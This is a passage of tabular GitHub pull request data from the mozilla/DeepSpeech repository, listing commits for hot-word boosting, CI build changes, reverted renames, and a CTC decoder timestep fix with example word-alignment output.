For example, if KenLM returns `-3.5` as the likelihood for the word sequence ""i like cheese"", if we add `3` to this number, we get `-0.75`, therefore increasing the likelihood of that sequence. On the other hand, if we add a `-3` to the likelihood, we decrease the likelihood of that sequence. Adding a negative number as a boost will make the decoder ""avoid"" certain words.",JRMeyer,8389864,2020-08-31T21:06:48Z,CONTRIBUTOR,True,400,11,25,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,6155e43ebee0762db1b09bce92b1ef04baa110e2,error out if hot_words without scorer
522,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3297,3297,enable hot-word boosting,"This PR enables hot-word boosting (immediate support in the C and Python clients) with the new flags `--hot_words`. 

The flag takes a string of `words` and their respective `boosts` separated by commas and colons, as such: `--hot_words ""friend:1.5,enemy:20.4""`. The `boost` takes a floating point number between `-inf` and `inf`.

The boosting is applied as an addition to the negative log likelihood of a candidate word sequence, given by the KenLM language model. Since the LM probability is a negative log value, at `0.0` we have 100% likelihood, and at negative infinity we have 0% likelihood. As such, we will always have some negative number from the KenLM model.

For example, if KenLM returns `-3.5` as the likelihood for the word sequence ""i like cheese"", if we add `3` to this number, we get `-0.75`, therefore increasing the likelihood of that sequence. On the other hand, if we add a `-3` to the likelihood, we decrease the likelihood of that sequence. Adding a negative number as a boost will make the decoder ""avoid"" certain words.",JRMeyer,8389864,2020-08-31T21:06:48Z,CONTRIBUTOR,True,400,11,25,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,6df4297ba26962feeead6e8fb743b09ca3c2652c,two new functions: remove hot-word and clear all hot-words
523,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3297,3297,enable hot-word boosting,"This PR enables hot-word boosting (immediate support in the C and Python clients) with the new flags `--hot_words`. 

The flag takes a string of `words` and their respective `boosts` separated by commas and colons, as such: `--hot_words ""friend:1.5,enemy:20.4""`. The `boost` takes a floating point number between `-inf` and `inf`.

The boosting is applied as an addition to the negative log likelihood of a candidate word sequence, given by the KenLM language model. Since the LM probability is a negative log value, at `0.0` we have 100% likelihood, and at negative infinity we have 0% likelihood. As such, we will always have some negative number from the KenLM model.

For example, if KenLM returns `-3.5` as the likelihood for the word sequence ""i like cheese"", if we add `3` to this number, we get `-0.75`, therefore increasing the likelihood of that sequence. On the other hand, if we add a `-3` to the likelihood, we decrease the likelihood of that sequence. Adding a negative number as a boost will make the decoder ""avoid"" certain words.",JRMeyer,8389864,2020-08-31T21:06:48Z,CONTRIBUTOR,True,400,11,25,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,22af3c6bef679b14eff7e15f072bbf1c07a7a37f,"starting to work on better error messages

X-DeepSpeech: NOBUILD"
524,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3297,3297,enable hot-word boosting,"This PR enables hot-word boosting (immediate support in the C and Python clients) with the new flags `--hot_words`. 

The flag takes a string of `words` and their respective `boosts` separated by commas and colons, as such: `--hot_words ""friend:1.5,enemy:20.4""`. The `boost` takes a floating point number between `-inf` and `inf`.

The boosting is applied as an addition to the negative log likelihood of a candidate word sequence, given by the KenLM language model. Since the LM probability is a negative log value, at `0.0` we have 100% likelihood, and at negative infinity we have 0% likelihood. As such, we will always have some negative number from the KenLM model.

For example, if KenLM returns `-3.5` as the likelihood for the word sequence ""i like cheese"", if we add `3` to this number, we get `-0.75`, therefore increasing the likelihood of that sequence. On the other hand, if we add a `-3` to the likelihood, we decrease the likelihood of that sequence. Adding a negative number as a boost will make the decoder ""avoid"" certain words.",JRMeyer,8389864,2020-08-31T21:06:48Z,CONTRIBUTOR,True,400,11,25,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,c90b05478fed932c88a9254f96700c9be9136c19,better error handling + .Net ERR codes
525,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3297,3297,enable hot-word boosting,"This PR enables hot-word boosting (immediate support in the C and Python clients) with the new flags `--hot_words`. 

The flag takes a string of `words` and their respective `boosts` separated by commas and colons, as such: `--hot_words ""friend:1.5,enemy:20.4""`. The `boost` takes a floating point number between `-inf` and `inf`.

The boosting is applied as an addition to the negative log likelihood of a candidate word sequence, given by the KenLM language model. Since the LM probability is a negative log value, at `0.0` we have 100% likelihood, and at negative infinity we have 0% likelihood. As such, we will always have some negative number from the KenLM model.

For example, if KenLM returns `-3.5` as the likelihood for the word sequence ""i like cheese"", if we add `3` to this number, we get `-0.75`, therefore increasing the likelihood of that sequence. On the other hand, if we add a `-3` to the likelihood, we decrease the likelihood of that sequence. Adding a negative number as a boost will make the decoder ""avoid"" certain words.",JRMeyer,8389864,2020-08-31T21:06:48Z,CONTRIBUTOR,True,400,11,25,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,b69a99c007cb077268733cdf10e2556311642155,allow for negative boosts:)
526,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3297,3297,enable hot-word boosting,"This PR enables hot-word boosting (immediate support in the C and Python clients) with the new flags `--hot_words`. 

The flag takes a string of `words` and their respective `boosts` separated by commas and colons, as such: `--hot_words ""friend:1.5,enemy:20.4""`. The `boost` takes a floating point number between `-inf` and `inf`.

The boosting is applied as an addition to the negative log likelihood of a candidate word sequence, given by the KenLM language model. Since the LM probability is a negative log value, at `0.0` we have 100% likelihood, and at negative infinity we have 0% likelihood. As such, we will always have some negative number from the KenLM model.

For example, if KenLM returns `-3.5` as the likelihood for the word sequence ""i like cheese"", if we add `3` to this number, we get `-0.75`, therefore increasing the likelihood of that sequence. On the other hand, if we add a `-3` to the likelihood, we decrease the likelihood of that sequence. Adding a negative number as a boost will make the decoder ""avoid"" certain words.",JRMeyer,8389864,2020-08-31T21:06:48Z,CONTRIBUTOR,True,400,11,25,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,753b62ffe0de7fb03de9c36861356a98c8479e37,adding TC test for hot-words
527,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3297,3297,enable hot-word boosting,"This PR enables hot-word boosting (immediate support in the C and Python clients) with the new flags `--hot_words`. 

The flag takes a string of `words` and their respective `boosts` separated by commas and colons, as such: `--hot_words ""friend:1.5,enemy:20.4""`. The `boost` takes a floating point number between `-inf` and `inf`.

The boosting is applied as an addition to the negative log likelihood of a candidate word sequence, given by the KenLM language model. Since the LM probability is a negative log value, at `0.0` we have 100% likelihood, and at negative infinity we have 0% likelihood. As such, we will always have some negative number from the KenLM model.

For example, if KenLM returns `-3.5` as the likelihood for the word sequence ""i like cheese"", if we add `3` to this number, we get `-0.75`, therefore increasing the likelihood of that sequence. On the other hand, if we add a `-3` to the likelihood, we decrease the likelihood of that sequence. Adding a negative number as a boost will make the decoder ""avoid"" certain words.",JRMeyer,8389864,2020-08-31T21:06:48Z,CONTRIBUTOR,True,400,11,25,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,a7a6dccb3a3d30b7b97b459373a9e73c04947028,"add hot-words to python client, make TC test hot-words everywhere"
528,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3296,3296,Fix #3129: Add CI coverage for transcribe.py,,lissyx,1645737,2020-08-31T15:22:53Z,COLLABORATOR,True,147,0,8,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,32ad25b088d1e88a2d374a11d791b8b4cc13bfd7,Fix #3129: Add CI coverage for transcribe.py
529,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3293,3293,Decouple builds,Fixes #3170,lissyx,1645737,2020-08-31T08:18:50Z,COLLABORATOR,True,31,27,11,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,4bc14acb12b9915f01b32c7ac97bb686f0f2e82b,"Decouple builds

Fixes #3170"
530,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3291,3291,Bump to 0.9.0a8,,lissyx,1645737,2020-08-29T12:02:00Z,COLLABORATOR,False,1,1,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,3bb72df6c8db14595a71d3986873ebc1322aff47,Bump to 0.9.0a8
531,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3290,3290,Fix SWIG prebuild URL,,lissyx,1645737,2020-08-28T15:19:06Z,COLLABORATOR,True,5,5,2,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,160fa76ddfa34638eabbf3e3038a822cf4baa30c,Fix SWIG prebuild URL
532,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3289,3289,Switch to new macOS VM setup,,lissyx,1645737,2020-08-28T12:10:45Z,COLLABORATOR,True,17,12,12,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,e9d263712feb64dbbd6d6f57a54b033333092356,Switch to new macOS VM setup
533,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3286,3286,Test PR #3268,,reuben,477142,2020-08-27T13:09:07Z,MEMBER,True,17,10,2,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,93a4de548955acea7ac654517fc7f1ced7491ef9,Fix lr initialization on reload.
534,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3284,3284,Switch to new macOS VM setup,,lissyx,1645737,2020-08-27T09:36:18Z,COLLABORATOR,True,17,12,12,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,3e6593d32578ce150571bce46bf596780085bdb8,Switch to new macOS VM setup
535,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3281,3281,Test repo rename on CI,,reuben,477142,2020-08-27T07:33:00Z,MEMBER,False,0,0,0,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,a89855efe9813e8128a466bdee1f69f7ae1d8c88,Test repo rename on CI
536,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3280,3280,Undo renames,,reuben,477142,2020-08-25T13:42:03Z,MEMBER,True,2372,2235,541,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,9788811bc59e3875985260ceaf6c7b845fd3f7e3,"Revert ""Merge pull request #3241 from lissyx/rename-ctcdecoder""

This reverts commit fd4185f1410a39af19742310403151646318faba, reversing
changes made to 1a7dd876017d0e7451abb1101d154b71b8d8edb5."
537,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3280,3280,Undo renames,,reuben,477142,2020-08-25T13:42:03Z,MEMBER,True,2372,2235,541,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,c62a604876855ae79d9b9587877a286215e094aa,"Revert ""Merge pull request #3248 from lissyx/rtd-rename""

This reverts commit ce71910ab4533e84eaf7be92bc1eb447305f4bd6, reversing
changes made to 7c6108a199f1d8f892c2d52088850aaa5a8792e9."
538,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3280,3280,Undo renames,,reuben,477142,2020-08-25T13:42:03Z,MEMBER,True,2372,2235,541,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,7a6508612d1ca974f7944e1a27e68b2185c2c3b6,"Revert ""Merge pull request #3246 from lissyx/fix-docker""

This reverts commit c01fda56c058779cc9dba952ce940c47398c4ed3, reversing
changes made to 3e99b0d8b2b2d6e47c8ff7eb1dfd9a88eba8e6d8."
539,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3280,3280,Undo renames,,reuben,477142,2020-08-25T13:42:03Z,MEMBER,True,2372,2235,541,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,10e2fc16f2b1b118cb1900e169b8365f453a5428,"Revert ""Merge pull request #3243 from lissyx/rename-stt-master""

This reverts commit 3e99b0d8b2b2d6e47c8ff7eb1dfd9a88eba8e6d8, reversing
changes made to 3a8c45cb619589f5f6acf4bfb71e7d6b18e8eab5."
540,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3280,3280,Undo renames,,reuben,477142,2020-08-25T13:42:03Z,MEMBER,True,2372,2235,541,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,7f99007840248723e52c4f43a5f427939a0df33f,"Revert ""Merge pull request #3238 from lissyx/rename-index""

This reverts commit 1a7dd876017d0e7451abb1101d154b71b8d8edb5, reversing
changes made to 08cebeda3c43b10bd8caa766ccd0feec7e305735."
541,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3280,3280,Undo renames,,reuben,477142,2020-08-25T13:42:03Z,MEMBER,True,2372,2235,541,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,d000d765480f6116f21b985c6377907abfeb230c,"Revert ""Merge pull request #3239 from lissyx/rename-circleci""

This reverts commit 08cebeda3c43b10bd8caa766ccd0feec7e305735, reversing
changes made to 86845dd022f9f77ddc4aff8023b9d5d2a663078a."
542,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3280,3280,Undo renames,,reuben,477142,2020-08-25T13:42:03Z,MEMBER,True,2372,2235,541,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,fee45c425e0ccb70ef3704d2cc509a731b96f57b,"Revert ""Merge pull request #3233 from lissyx/examples-rename-master""

This reverts commit 86845dd022f9f77ddc4aff8023b9d5d2a663078a, reversing
changes made to 3dcb3743acc14ed9de63110709446791892f8936."
543,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3280,3280,Undo renames,,reuben,477142,2020-08-25T13:42:03Z,MEMBER,True,2372,2235,541,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,da55cfae86452ed151ae93eaf39d028353f39e40,"Revert ""Merge pull request #3237 from lissyx/rename-training-package""

This reverts commit 3dcb3743acc14ed9de63110709446791892f8936, reversing
changes made to 457198c88d7ad96ee4596cb21deaeca77c277898."
544,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3280,3280,Undo renames,,reuben,477142,2020-08-25T13:42:03Z,MEMBER,True,2372,2235,541,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,01fd13b6631897018a7559a6a62a264143e03fa9,"Revert ""Merge pull request #3229 from mozilla/nodejs-scoped-name""

This reverts commit 402fc71abf01491cb6b99cc4f9cb69820c0fb842, reversing
changes made to 0610a7a76fba80df73a220b76b07946ba9ac4581."
545,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3280,3280,Undo renames,,reuben,477142,2020-08-25T13:42:03Z,MEMBER,True,2372,2235,541,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,386935e1fa03e4d592409872777370019ba8dd1b,"Revert ""Merge pull request #3230 from mozilla/rename-nuget-gpu-to-cuda""

This reverts commit 0610a7a76fba80df73a220b76b07946ba9ac4581, reversing
changes made to c31df0fd4cba77e632b1ad76c27162727a98e540."
546,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3280,3280,Undo renames,,reuben,477142,2020-08-25T13:42:03Z,MEMBER,True,2372,2235,541,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,ae0cf8db6aeeaa93ab2bbf89e9e76ba52347ae5e,"Revert ""Merge branch 'rename-real'""

This reverts commit ae9fdb183ec6eb422635c0e3a44c0c2ee5732224, reversing
changes made to 2eb75b62064ac30c1c537f4174d00b6e521042c5."
547,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3280,3280,Undo renames,,reuben,477142,2020-08-25T13:42:03Z,MEMBER,True,2372,2235,541,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,d1c964c5d55512932f7e0e44d11db6bd31b0e059,Adjust TF cache indices for 2.3 + renames undone
548,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3280,3280,Undo renames,,reuben,477142,2020-08-25T13:42:03Z,MEMBER,True,2372,2235,541,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,8f2c1e842a1da55bf4ed7cf4cc3252c8001b0580,Explicitly name repository clone target in Dockerfiles
549,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3280,3280,Undo renames,,reuben,477142,2020-08-25T13:42:03Z,MEMBER,True,2372,2235,541,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,81ce5436704865980b1fbfdf7fe9bf22b0c69d51,Fix bad conflict resolution in bazel rebuild check
550,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3280,3280,Undo renames,,reuben,477142,2020-08-25T13:42:03Z,MEMBER,True,2372,2235,541,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,b9e2d90a734026241b8d564c6ee799ee4f01b81c,Point to reverted examples changes
551,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3280,3280,Undo renames,,reuben,477142,2020-08-25T13:42:03Z,MEMBER,True,2372,2235,541,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,dc2503c5e07119d96fc60e7f1630c25756e69a90,Specify macOS SDK version along with minimum version in builds
552,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3280,3280,Undo renames,,reuben,477142,2020-08-25T13:42:03Z,MEMBER,True,2372,2235,541,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,b70db48f915f443eb122ab2918852fe75f55ec61,Rename new tasks
553,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3280,3280,Undo renames,,reuben,477142,2020-08-25T13:42:03Z,MEMBER,True,2372,2235,541,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,3aa3862fbc928a168a1b7ee7d290d660b711ec63,Fix TF cache references after rebase
554,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3279,3279,"The CTC decoder timesteps now corresponds to the timesteps of the most probable CTC path, instead of the earliest timesteps of all possible paths.","This follows the issue #3180 .

I suggest a new way of handling timesteps produced by the CTC decoder. There is no strange heuristic, and I think the logic is clear : when fusing two different paths leading to the same prefix, not only fuse the probabilities (the probabilities are added), but also fuse the timestep sequences (for the last letter in the sequence, choose the timestep from the most probable path).

The place where two different paths leading to the same prefix are fused are the places where `log_sum_exp` is called, because this function fuses the probabilities. So, timesteps would now be fused at the same places.

The other change is that each `PathTrie` node would now store the full sequence of timesteps. This is because one prefix can be an ancestor of another and their timesteps on a given node can differ. Having the full sequence of timesteps in each node, we have no need to duplicate a node with different timesteps, and it is much simpler like that. 
Moreover, it makes sense to store the *full* sequence of timesteps, because the *combined* probabilities are also stored there. The total probability is not the sum of the probability of each output token, and, in the same way, the correct sequence of timesteps is not the concatenation of the timestep of each output token.

Since I need to compare the probability of different paths (to keep the timesteps of the most probable one), it is important to compare paths of the same length (eg. paths from the beginning up to the current time). So, exactly the same way as it is done for the probabilities, I need to know the timesteps of the previous time, and store the timesteps of the current time separately.

In the end, timesteps are handled in a way very similar to the way probabilities are handled.

### Results on an example
To evaluate the resulting timesteps, I first take the argmax of my logits. In my example, it gives :
```
tou_________________________________________________ss  les  _a__mouurreuux  de  se_p_ort__ diiivverrr_  ss'enn__ _r_é___j_uuii__rr__on_t____    aa_v_eecc_   l''aap__p_rroo___chhee_____    de_  ll'hhi__v_e_rr____  et   la   rre__p_rri_ssee  dee  la  c_ouppee ddu  mon_deee      ss__kk_i___      less    ii_mm_a__ggees_   de   _g_ll_i_ss__ssee____________________             ree__t_rrou_vveennt    uunee    __pllaa___cee____      de    _cchhooixx__  d_ans_  lles  _pp_a____ggeess        ssspp_o_r_t_ii_vees_  de  v_o_s_ _jourrnnaauxx  ttéé_l_é___v_ii___ss_é__s__      ddeeu_x_   __é___pprreeuu_vvees___________________          _auu_jjoouurrdd''hhuuii___       _o____nno___rr_o_____d__a___mm________ ___s___a_n______t__a______  _q__a___tt__e___rr_i____n__a_____     __p_r____mmie_r__  s__a___l__o___m___    _g_é____ant__  de   lla  _c_ou_ppee  ddu   m_on___deee____________________________________________________
```
As the logits are the only input of the decoder, I base my evaluation on them instead of comparing with the audio file directly. It is known that the CTC loss does not guarantee alignment between the audio file and the logits, so the best thing the decoder can do is to fit the logits as best as it can. This is reasonable because, in practice, the logits are aligned quite well with the audio file.

Then, for each word, I take the part of the logits corresponding to the output timesteps, take the argmax (as said above), and print the corresponding decoded text. 

Finally, I assume that good timesteps should lead to a good match between the word and its corresponding text decoded from the argmax of the logits.

Before this PR, the result in my example is (text between slashes is from the logits argmax, spaces are trimmed) : 
```
[WordScoreRange(word=tous /tou/, score=None, ranges=((0, 4),)),   
 WordScoreRange(word=les /les/, score=None, ranges=((55, 59),)),       
 WordScoreRange(word=amoureux /amoureu/, score=None, ranges=((60, 74),)),
 WordScoreRange(word=de /d/, score=None, ranges=((75, 78),)),           
 WordScoreRange(word=sport /seport/, score=None, ranges=((80, 90),)),           
 WordScoreRange(word=divers /diver/, score=None, ranges=((91, 102),)),
 WordScoreRange(word=s'en /s'en/, score=None, ranges=((103, 111),)),  
 WordScoreRange(word=réjouiront /réjuiron/, score=None, ranges=((112, 136),)),
 WordScoreRange(word=avec /avec/, score=None, ranges=((141, 153),)),  
 WordScoreRange(word=l'approche /l'approche/, score=None, ranges=((155, 179),)),
 WordScoreRange(word=de /de/, score=None, ranges=((185, 191),)),  
 WordScoreRange(word=l'hiver /l'hive/, score=None, ranges=((192, 206),)),
 WordScoreRange(word=et /e/, score=None, ranges=((208, 215),)),
 WordScoreRange(word=la /la/, score=None, ranges=((217, 221),)),
 WordScoreRange(word=reprise /reprise/, score=None, ranges=((222, 238),)),
 WordScoreRange(word=de /de/, score=None, ranges=((240, 243),)),
 WordScoreRange(word=la /la/, score=None, ranges=((244, 248),)),
 WordScoreRange(word=coupe /coupe/, score=None, ranges=((249, 257),)),
 WordScoreRange(word=du /d/, score=None, ranges=((258, 261),)),
 WordScoreRange(word=monde /monde/, score=None, ranges=((263, 270),)),
 WordScoreRange(word=de /e/, score=None, ranges=((271, 275),)),
 WordScoreRange(word=ski /ski/, score=None, ranges=((276, 286),)),
 WordScoreRange(word=les /les/, score=None, ranges=((290, 298),)),
 WordScoreRange(word=images /image/, score=None, ranges=((300, 316),)),
 WordScoreRange(word=de /d/, score=None, ranges=((318, 322),)),
 WordScoreRange(word=glisse /glisse/, score=None, ranges=((324, 341),)),
 WordScoreRange(word=retrouvent /retrouvent/, score=None, ranges=((363, 394),)),
 WordScoreRange(word=une /une/, score=None, ranges=((395, 402),)),
 WordScoreRange(word=place /place/, score=None, ranges=((404, 419),)),
 WordScoreRange(word=de /de/, score=None, ranges=((425, 432),)),
 WordScoreRange(word=choix /choix/, score=None, ranges=((433, 445),)),
 WordScoreRange(word=dans /dans/, score=None, ranges=((448, 455),)),
 WordScoreRange(word=les /les/, score=None, ranges=((457, 462),)),
 WordScoreRange(word=pages /pages/, score=None, ranges=((463, 478),)),
 WordScoreRange(word=sportives /sportives/, score=None, ranges=((479, 506),)),
 WordScoreRange(word=de /de/, score=None, ranges=((508, 511),)),
 WordScoreRange(word=vos /vos/, score=None, ranges=((512, 518),)),
 WordScoreRange(word=journaux /journaux/, score=None, ranges=((520, 532),)),
 WordScoreRange(word=télévisés /télévisé/, score=None, ranges=((533, 559),)),
 WordScoreRange(word=deux /deux/, score=None, ranges=((563, 575),)),
 WordScoreRange(word=épreuves /épreuve/, score=None, ranges=((577, 598),)),
 WordScoreRange(word=aujourd'hui /aujourd'hu/, score=None, ranges=((618, 649),)),
 WordScoreRange(word=on /o/, score=None, ranges=((654, 665),)),
 WordScoreRange(word=a /am/, score=None, ranges=((685, 699),)),
 WordScoreRange(word=santa /santa/, score=None, ranges=((703, 726),)),
 WordScoreRange(word=caterina /qaterina/, score=None, ranges=((729, 756),)),
 WordScoreRange(word=premier /prmier/, score=None, ranges=((762, 783),)),
 WordScoreRange(word=salon /salom/, score=None, ranges=((785, 803),)),
 WordScoreRange(word=géant /géant/, score=None, ranges=((805, 818),)),
 WordScoreRange(word=de /d/, score=None, ranges=((819, 823),)),
 WordScoreRange(word=la /l/, score=None, ranges=((825, 829),)),
 WordScoreRange(word=coupe /coupe/, score=None, ranges=((831, 841),)),
 WordScoreRange(word=du /d/, score=None, ranges=((842, 846),)),
 WordScoreRange(word=monde /mon/, score=None, ranges=((848, 857),))]
```

After this PR, the result in my example is : 
```
[WordScoreRange(word=tous /tous/, score=None, ranges=((0, 54),)), 
 WordScoreRange(word=les /les/, score=None, ranges=((56, 59),)),        
 WordScoreRange(word=amoureux /amoureux/, score=None, ranges=((62, 75),)),
 WordScoreRange(word=de /de/, score=None, ranges=((77, 79),)),          
 WordScoreRange(word=sport /seport/, score=None, ranges=((81, 91),)),           
 WordScoreRange(word=divers /diver/, score=None, ranges=((92, 103),)),
 WordScoreRange(word=s'en /s'en/, score=None, ranges=((105, 113),)),  
 WordScoreRange(word=réjouiront /réjuiront/, score=None, ranges=((114, 140),)),
 WordScoreRange(word=avec /avec/, score=None, ranges=((145, 155),)),  
 WordScoreRange(word=l'approche /l'approche/, score=None, ranges=((158, 185),)),
 WordScoreRange(word=de /de/, score=None, ranges=((189, 192),)),  
 WordScoreRange(word=l'hiver /l'hiver/, score=None, ranges=((194, 212),)),
 WordScoreRange(word=et /et/, score=None, ranges=((214, 216),)),                                                               
 WordScoreRange(word=la /la/, score=None, ranges=((219, 221),)),
 WordScoreRange(word=reprise /reprise/, score=None, ranges=((224, 239),)),                                                                                                                         
 WordScoreRange(word=de /de/, score=None, ranges=((241, 244),)),            
 WordScoreRange(word=la /la/, score=None, ranges=((246, 248),)),              
 WordScoreRange(word=coupe /coupe/, score=None, ranges=((250, 258),)),
 WordScoreRange(word=du /du/, score=None, ranges=((259, 262),)),            
 WordScoreRange(word=monde /monde/, score=None, ranges=((264, 272),)),
 WordScoreRange(word=de //, score=None, ranges=((273, 275),)),
 WordScoreRange(word=ski /ski/, score=None, ranges=((278, 289),)),
 WordScoreRange(word=les /les/, score=None, ranges=((295, 299),)),
 WordScoreRange(word=images /images/, score=None, ranges=((303, 318),)),
 WordScoreRange(word=de /de/, score=None, ranges=((321, 323),)),
 WordScoreRange(word=glisse /glisse/, score=None, ranges=((327, 362),)),
 WordScoreRange(word=retrouvent /retrouvent/, score=None, ranges=((375, 394),)),
 WordScoreRange(word=une /une/, score=None, ranges=((398, 403),)),
 WordScoreRange(word=place /place/, score=None, ranges=((409, 424),)),
 WordScoreRange(word=de /de/, score=None, ranges=((430, 432),)),
 WordScoreRange(word=choix /choix/, score=None, ranges=((437, 448),)),
 WordScoreRange(word=dans /dans/, score=None, ranges=((450, 456),)),
 WordScoreRange(word=les /les/, score=None, ranges=((458, 462),)),
 WordScoreRange(word=pages /pages/, score=None, ranges=((465, 479),)),
 WordScoreRange(word=sportives /sportives/, score=None, ranges=((487, 507),)),
 WordScoreRange(word=de /de/, score=None, ranges=((509, 511),)),
 WordScoreRange(word=vos /vos/, score=None, ranges=((513, 519),)),
 WordScoreRange(word=journaux /journaux/, score=None, ranges=((521, 533),)),
 WordScoreRange(word=télévisés /télévisés/, score=None, ranges=((535, 562),)),
 WordScoreRange(word=deux /deux/, score=None, ranges=((568, 576),)),
 WordScoreRange(word=épreuves /épreuves/, score=None, ranges=((581, 618),)),
 WordScoreRange(word=aujourd'hui /aujourd'hui/, score=None, ranges=((629, 654),)),
 WordScoreRange(word=on /onoro/, score=None, ranges=((662, 680),)),
 WordScoreRange(word=a /am/, score=None, ranges=((685, 699),)),
 WordScoreRange(word=santa /santa/, score=None, ranges=((703, 726),)),
 WordScoreRange(word=caterina /qaterina/, score=None, ranges=((729, 761),)),
 WordScoreRange(word=premier /prmier/, score=None, ranges=((768, 783),)),
 WordScoreRange(word=salon /salom/, score=None, ranges=((785, 803),)),
 WordScoreRange(word=géant /géant/, score=None, ranges=((808, 820),)),
 WordScoreRange(word=de /de/, score=None, ranges=((822, 824),)),
 WordScoreRange(word=la /l/, score=None, ranges=((826, 829),)),
 WordScoreRange(word=coupe /coupe/, score=None, ranges=((833, 842),)),
 WordScoreRange(word=du /d/, score=None, ranges=((843, 846),)),
